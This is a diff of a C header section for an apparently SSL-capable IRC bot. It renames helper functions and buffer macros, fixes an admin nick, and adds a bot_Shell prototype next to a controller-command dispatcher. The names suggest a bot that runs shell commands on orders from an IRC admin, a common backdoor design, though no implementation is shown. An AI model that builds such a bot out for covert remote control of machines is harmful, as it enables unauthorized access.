@@ -35,7 +35,7 @@ char b_Brand[] = {
 };
 
 /* Bot Adm Nick */
-#define BOT_ADM "stackille"
+#define BOT_ADM "stackiller"
 
 /* get size of pointer array */ 
 #define ARRAY_SIZE(x) ((sizeof(x)) / (sizeof(x[0])))
@@ -45,7 +45,6 @@ typedef struct {
   SSL_CTX *ctx; // SSL context pointer
   SSL *ssl; // ssl Descriptor
   int sockfd; // socket file descriptor
-  bool isSSL;
   char *host, *port; // host and port
   char *nick, *pass; // nick and pass
   char *chans, *buffer; // channels && buffer
@@ -57,33 +56,35 @@ SSL_CTX* init_Ctx(void);
 int new_Conn(const char*, int); // create socket
 int b_Pong(char*);
 int str_Cmp(char*, char*); // compare two strings.
-int m_haveNull(char**, int);
+int matrix_haveNull(char**, int);
 
 char* r_Buffer(void);
 char* str_Chr(char*, char); // split token, using ch.
-char* g_Nick(char*); // get user nick of message.
-char* g_Chan(char*); // get channel of message.
-char* g_Msg(char*); // get message of buffer.
-char* g_Host(char*, char, char); // get host of message.
-char* g_nArg(char*, int); // get arguments of message.
+char* get_Dst(char*); // get channel of message.
+char* get_Msg(char*); // get message of buffer.
+char* get_Src(char*); // get host of message.
+char* get_nArg(char*, int); // get arguments of message.
+char* g_Args(char*); // get all arguments of message.
 
-void m_Destroy(char **, int);
+void matrix_Destroy(char **, int);
 
 void m_Send(char*);
 void show_Certs(SSL*);
 void b_Nick(char*);
 void b_Creds(char*, char*);
 void b_Join(char*);
-void b_Priv(char*, char*);
-void b_Part(char*);
+void bot_Priv(char*, char*);
+void bot_Part(char*);
+void bot_Shell(char*, char*);
 void p_Msg(char*, char*);
-int b_Exec(char*, char*, char*); // controller bot commands.
+int bot_Exec(char*, char*, char*); // controller bot commands.
 void b_Header(void);
 void usage(char*);
+void release(void *ptr);
 
 // Sizes
-#define M_LEN 80000
-#define M_LLEN 4024
+#define BUFFER_SIZE 80000
+#define BUFFER_LINE_SIZE 4024
 #define B_LEN 50
 
 // Error defines
